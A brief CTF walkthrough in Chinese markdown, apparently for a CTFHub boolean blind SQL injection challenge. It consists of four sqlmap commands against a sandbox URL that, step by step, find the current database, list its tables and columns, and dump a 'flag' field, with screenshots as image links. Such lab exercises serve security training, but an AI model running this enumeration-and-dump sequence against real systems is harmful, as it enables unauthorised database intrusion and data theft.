

```sql
python sqlmap.py http://challenge-aeba318a505edece.sandbox.ctfhub.com:10800/?id=1 --current-db --batch
//查询当前数据库名
```

![1686846074134](image/d.布尔盲注/1686846074134.png)

```sql
python sqlmap.py http://challenge-aeba318a505edece.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables --batch
//查询sqli内所有的表
```

![1686846215221](image/d.布尔盲注/1686846215221.png)

```sql
python sqlmap.py http://challenge-aeba318a505edece.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns --batch
//查询flag表内的字段
```

![1686846399935](image/d.布尔盲注/1686846399935.png)

```sql
python sqlmap.py http://challenge-aeba318a505edece.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C "flag" --dump --batch
//查询flag字段的内容
```

![1686846629268](image/d.布尔盲注/1686846629268.png)
